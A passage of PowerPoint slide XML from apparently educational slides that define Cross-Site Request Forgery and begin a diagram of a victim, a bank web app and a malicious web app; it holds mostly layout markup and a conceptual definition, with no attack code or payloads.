            <a:r>
              <a:rPr dirty="0" spc="-254"/>
              <a:t>SITE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t>REQUEST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t>FORGERY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-185"/>
              <a:t>(CSRF/XSRF)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962050" y="1533220"/>
            <a:ext cx="10132060" cy="2627630"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="565150" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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These</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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aim</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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forcing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>end-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user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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execute</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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unintended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	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actions</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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they</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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currently</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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authenticated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>on</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Unintended</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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actions</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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may</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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include</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>state-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changing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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operations</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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such</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>as </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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transferring</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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funds,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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changing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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associated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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account,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="349885" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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If</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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victim</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>administration</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-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privileges,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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attack</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>can </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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result</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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compromising</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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entire</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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application</a:t>
            </a:r>
            <a:endParaRPr sz="2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170"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t>ATTACKS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t>DYNAMICS</a:t>
            </a:r>
          </a:p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33321" y="1814457"/>
            <a:ext cx="1548917" cy="1611240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9639045" y="1476502"/>
            <a:ext cx="1412240" cy="2123440"/>
            <a:chOff x="9639045" y="1476502"/>
            <a:chExt cx="1412240" cy="2123440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9645395" y="1482852"/>
              <a:ext cx="1399540" cy="2110740"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1399540" h="2110740">
                  <a:moveTo>
                    <a:pt x="1165859" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="233172" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186179" y="4737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142410" y="18323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102803" y="39821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68294" y="68294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39821" y="102803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18323" y="142410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4737" y="186179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="233172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1877568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4737" y="1924560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18323" y="1968329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39821" y="2007936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68294" y="2042445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102803" y="2070918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142410" y="2092416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186179" y="2106002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233172" y="2110740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1165859" y="2110740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1212852" y="2106002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1256621" y="2092416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1296228" y="2070918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1330737" y="2042445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1359210" y="2007936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1380708" y="1968329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394294" y="1924560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399031" y="1877568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399031" y="233172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394294" y="186179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1380708" y="142410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1359210" y="102803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1330737" y="68294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1296228" y="39821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1256621" y="18323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1212852" y="4737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1165859" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9645395" y="1482852"/>
              <a:ext cx="1399540" cy="2110740"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1399540" h="2110740">
                  <a:moveTo>
                    <a:pt x="0" y="233172"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4737" y="186179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18323" y="142410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39821" y="102803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68294" y="68294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102803" y="39821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142410" y="18323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186179" y="4737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233172" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1165859" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1212852" y="4737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1256621" y="18323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1296228" y="39821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1330737" y="68294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1359210" y="102803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1380708" y="142410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394294" y="186179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399031" y="233172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399031" y="1877568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394294" y="1924560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1380708" y="1968329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1359210" y="2007936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1330737" y="2042445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1296228" y="2070918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1256621" y="2092416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1212852" y="2106002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1165859" y="2110740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233172" y="2110740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186179" y="2106002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142410" y="2092416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102803" y="2070918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68294" y="2042445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39821" y="2007936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18323" y="1968329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4737" y="1924560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1877568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="233172"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00252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" name="object 7" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9904603" y="1962403"/>
            <a:ext cx="879475" cy="574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 indent="139700">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Target </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-9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800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App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8" name="object 8" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10034143" y="2785364"/>
            <a:ext cx="62166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10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(Bank)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9" name="object 9" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2525014" y="3765550"/>
            <a:ext cx="1412240" cy="927100"/>
            <a:chOff x="2525014" y="3765550"/>
            <a:chExt cx="1412240" cy="927100"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="object 10" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2531364" y="3771900"/>
              <a:ext cx="1399540" cy="914400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1399539" h="914400">
                  <a:moveTo>
                    <a:pt x="1246632" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1246632" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294814" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1336651" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1369637" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1391265" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399032" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399032" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1391265" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1369637" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1336651" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294814" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1246632" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2531364" y="3771900"/>
              <a:ext cx="1399540" cy="914400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1399539" h="914400">
                  <a:moveTo>
                    <a:pt x="0" y="152400"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1246632" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294814" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1336651" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1369637" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1391265" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399032" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1399032" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1391265" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1369637" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1336651" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294814" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1246632" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A000E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2" name="object 12" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2774060" y="3928364"/>
            <a:ext cx="912494" cy="574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9209" marR="5080" indent="-17145">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Malicious </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-9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800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App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3" name="object 13" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1226616" y="3447669"/>
            <a:ext cx="61468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10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Victim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4" name="object 14" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532126" y="1938527"/>
            <a:ext cx="7114540" cy="459105"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7114540" h="459105">
                <a:moveTo>
                  <a:pt x="7114159" y="382524"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="114300" y="382524"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="344424"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="401574"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="458724"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="420624"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114159" y="420624"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114159" y="382524"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="7114540" h="459105">
                <a:moveTo>
                  <a:pt x="7114159" y="57150"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="7076059" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999859" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999859" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999859" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999859" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7076059" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114159" y="57150"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00637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" name="object 15" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3796665" y="1582953"/>
            <a:ext cx="4584065" cy="740410"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="12636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94"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
